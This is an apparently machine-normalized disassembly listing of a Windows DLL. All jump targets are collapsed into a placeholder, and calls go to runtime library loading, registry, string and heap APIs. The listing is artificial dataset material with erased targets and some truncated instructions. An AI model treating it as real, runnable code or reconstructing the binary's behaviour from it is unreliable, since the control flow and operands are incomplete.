mov [ ebp - 0x93c ] 0xff
call edi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x930 ]
push ecx
call [ RegCloseKey@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x938 ]
mov ebx [ StrStrIW@IAT ]
push eax
lea ecx [ ebp - 0x324 ]
push ecx
call ebx
test eax eax
je r-xdata
mov eax [ ebp - 0x944 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0x15
call sub_10019570
mov ebx [ ebp - 0x940 ]
lea ecx [ ebp - 0x72c ]
push ecx
lea edx [ ebp - 0x324 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x104
call sub_1006d3c0
add esp 0xc
push eax
lea edx [ ebp - 0x324 ]
push edx
call ebx
test eax eax
je r-xdata
sub_1001339a
push 0xe0
mov eax sub_10085b91
call sub_10047689
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
movzx eax [ ebp + 0x1c ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10010f30
pop ecx
mov edi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xa8 ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1002f6be
mov edi eax
pop ecx
mov [ ebp - 0x88 ] edi
lea ecx [ ebp - 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub eax [ ebp + 0x34 ]
push esi
inc eax
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_100212b7
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_1002be90
add esi 0x8
push esi
push ebx
push 0x30
call sub_10032181
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x98 ] esi
call sub_10026407
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8c ] eax
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x20 ] 0x0
mov esi [ ebp - 0x88 ]
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx esi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_1002f75b
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_1001fc54
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ ebp - 0x8c ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_100332a0
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_1005664f
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_10069470
push eax
lea ecx [ ebp - 0x2c ]
call sub_1005664f
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_10069470
and [ ebp - 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
movzx ebx ax
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi [ ebp - 0x8c ]
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor esi esi
jg r-xdata
cmp [ ebp + 0x34 ] edi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor ebx ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push ebx
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_100212b7
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x94 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_100650d7
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004171f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
test bl bl
jne r-xdata
sub eax edx
mov esi eax
jmp r-xdata
xor esi esi
cmp esi edi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc ebx
cmp ebx 0x4
jb r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004171f
add esp 0x14
xor esi esi
cmp [ ebp - 0x50 ] 0x8
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x8c ] eax
cmp eax 0x40
je r-xdata
movsx eax [ ebp + ebx - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x90 ]
push esi
push [ ebp - 0x94 ]
xor edi edi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] edi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] edi
push [ ebp - 0xa4 ]
call sub_1004171f
add esp 0x14
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_10069470
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10069470
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10005b50
push edi
push esi
lea ecx [ ebp + 0x24 ]
call sub_10069470
mov eax [ ebp - 0xa4 ]
call sub_100262c3
retn 0x38
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
test edi edi
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add eax 0x2
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0xc ]
push eax
call sub_1001688c
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push 0x1
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] edi
ja r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0x8c ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
push [ ebp - 0x98 ]
lea ecx [ ebp + 0xc ]
call sub_100650d7
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_100650d7
mov eax edi
sub eax [ ebp + 0x34 ]
push eax
push [ ebp - 0x98 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004171f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xbc ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xcc ]
push [ ebp + 0xc ]
push eax
call sub_1001688c
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp + 0x10 ] eax
mov eax [ ecx ]
add esp 0x14
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_100650d7
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
lea eax [ eax + ecx * 2 ]
push edi
push eax
lea eax [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
call sub_1001688c
add esp 0x14
jmp r-xdata
sub_10013913
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
add esi 0x2
sub_10013950
push ebp
mov ebp esp
push 0xffffffff
push sub_10088472
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_100273a0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_100273a0
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] dx
push eax
jmp r-xdata
call sub_10033f90
sub_10013a49
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000842a
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_10013b13
mov edi edi
push ebp
mov ebp esp
mov dx [ ebp + 0xc ]
push esi
cmp [ ebp + 0x10 ] dx
ja r-xdata
cmp [ ebp + 0x14 ] dx
ja r-xdata
movzx ecx [ ebp + 0x10 ]
movzx eax dx
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x18 ] dx
ja r-xdata
movzx ecx [ ebp + 0x14 ]
movzx eax dx
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movzx ecx [ ebp + 0x18 ]
movzx eax dx
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_10013b6a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
jmp r-xdata
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp edx [ ebp + 0xc ]
setne al
movzx eax [ edx ]
movzx ecx [ esi ]
cmp cx ax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jb r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
add edx 0x2
add esi 0x2
sub_10013bb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ eax ]
push ecx
push edx
call eax
add esp 0x8
pop ebp
retn
sub_10013bd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088a17
mov eax [ fs : 0x0 ]
push eax
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x8 ] 0x0
mov [ ebp - 0x240 ] ebx
jne r-xdata
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebx + 0xa4 ]
lea esi [ ebx + 0x94 ]
push r--data
xor edi edi
mov ecx esi
call sub_100449d0
test eax eax
je r-xdata
cmp [ ebx + 0x84 ] 0x8
lea eax [ ebx + 0x70 ]
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov [ ebx + 0x90 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x88 ]
mov eax 0x48
call sub_10069020
mov ecx edx
push ecx
lea edx [ ebp - 0x21c ]
add ebx 0xc
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x6
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
cmp [ ebp - 0x208 ] 0x8
jb r-xdata
push eax
mov eax [ ebx + 0x90 ]
push eax
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x1c8 ]
push eax
push 0xffffffff
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edx [ ebx + 0x90 ]
lea ecx [ ebp - 0x1c8 ]
push ecx
push edx
jmp r-xdata
mov esi [ esi ]
lea edx [ ebp - 0x84 ]
mov eax 0x153
call sub_10069020
mov eax edx
push eax
lea ecx [ ebp - 0x21c ]
add ebx 0xc
push ecx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x6
mov [ ebp - 0x4 ] 0x0
call sub_10022b50
cmp [ ebp - 0x208 ] 0x8
jb r-xdata
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0x21c ]
push eax
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x34 ]
mov eax 0x4f
call sub_10069020
lea edx [ ebp - 0xc4 ]
mov eax 0x2d
call sub_10069020
mov ecx edx
push ecx
lea edx [ ebp - 0x1e4 ]
add ebx 0xc
push edx
call sub_10029ef0
push eax
lea edx [ ebp - 0x34 ]
lea esi [ ebp - 0x238 ]
mov [ ebp - 0x4 ] 0x2
call sub_100519f0
add esp 0xc
mov ecx eax
mov ebx [ ebp - 0x240 ]
add ebx 0x2c
mov eax ebx
lea esi [ ebp - 0x200 ]
mov [ ebp - 0x4 ] 0x3
call sub_1006acf0
mov edx eax
mov ecx 0x6
mov [ ebp - 0x4 ] 0x4
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x1ec ] esi
jb r-xdata
call [ GetProcAddress@IAT ]
mov [ ebp - 0x23c ] eax
cmp eax edi
jne r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x21c ]
push edx
call sub_1000a86e
add esp 0x4
xor edi edi
xor ecx ecx
mov [ ebp - 0x1ec ] 0x7
mov [ ebp - 0x1f0 ] edi
mov [ ebp - 0x200 ] cx
cmp [ ebp - 0x224 ] esi
jb r-xdata
mov eax [ ebp - 0x200 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x224 ] 0x7
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x238 ] ax
cmp [ ebp - 0x1d0 ] esi
jb r-xdata
mov edx [ ebp - 0x238 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x1d0 ] 0x7
mov [ ebp - 0x1d4 ] edi
mov [ ebp - 0x1e4 ] dx
cmp [ ebx + 0x14 ] esi
jb r-xdata
mov ecx [ ebp - 0x1e4 ]
push ecx
call sub_1000a86e
add esp 0x4
push ebx
call [ ebp - 0x23c ]
mov ecx [ ebp - 0x240 ]
mov [ ecx + 0x50 ] eax
xor eax eax
mov ebx [ ebx ]
sub_10013eb0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x40
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1002d970
mov eax esi
mov esp ebp
pop ebp
retn
sub_10013ee0
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_10013f1b
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_10013fce
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_1005aa50
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1000f103
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10066465
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_1001418e
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
movsx ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax ecx
leave
retn
sub_100141b2
push 0x28
mov eax sub_10085e3c
call sub_10026266
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_1000a631
mov [ esi ] r--data
jmp r-xdata
sub_10014247
push 0x8
push r--data
call sub_1007fad0
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_1007fb15
retn
push 0x6
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001428d
call sub_10084876
inc [ rw-data ]
sub_10014296
push 0x80
mov eax sub_100855be
call sub_10047689
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_10007a10
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1004aa10
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x78 ] eax
call sub_1002be90
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10026407
add edi 0x8
push edi
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] edi
call sub_10032181
push edi
movzx eax ax
push ebx
push 0x61
mov [ ebp - 0x60 ] eax
call sub_10032181
push edi
movzx eax ax
push ebx
push 0x41
mov [ ebp - 0x80 ] eax
call sub_10032181
movzx eax ax
add esp 0x24
push [ ebp - 0x5c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x70 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] bl
call sub_1002839c
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
push [ ebp - 0x5c ]
